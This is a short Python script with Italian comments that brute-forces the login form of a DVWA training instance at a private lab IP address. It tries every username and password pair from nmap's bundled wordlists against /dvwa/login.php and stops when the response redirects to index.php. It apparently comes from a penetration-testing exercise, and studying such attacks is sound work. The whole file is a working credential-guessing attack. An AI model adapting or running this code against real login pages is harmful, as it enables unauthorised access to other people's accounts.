#importiamo la libreria http.client usato insieme alla urllib.parse per la gestione di url http
import http.client, urllib.parse
#liste username e password
username_file = open('/usr/share/nmap/nselib/data/usernames.lst')
password_file = open('/usr/share/nmap/nselib/data/passwords.lst')

user_list = username_file.readlines()
pwd_list = password_file.readlines()
#ciclo for per la ricerca di username e password
for user in user_list:
        user = user.rstrip()
        for pwd in pwd_list:
                pwd = pwd.rstrip()

                print (user, "-", pwd)
#definire i parametri per la pagina di login
                post_parameters = urllib.parse.urlencode({'username': user, 'password': pwd, 'Login': "Submit"})
#specifica degli headers della pagina HTTP
                headers = {'Content-type': 'application/x-www-form-urlencoded','Accept': 'text/html,application/xhtml+xml'}
#creazione connessione HTTP all'IP del server, inserimento dei parametri di login
                connection = http.client.HTTPConnection("192.168.32.101",80)
                connection.request('POST','/dvwa/login.php', post_parameters, headers)
                response = connection.getresponse()
#costrutto if per verificare se la risposta dell'header sia la pagina desiderata
                if(response.getheader('location') == 'index.php'):
                        print('Logged with', user,'-', pwd)
                        exit()
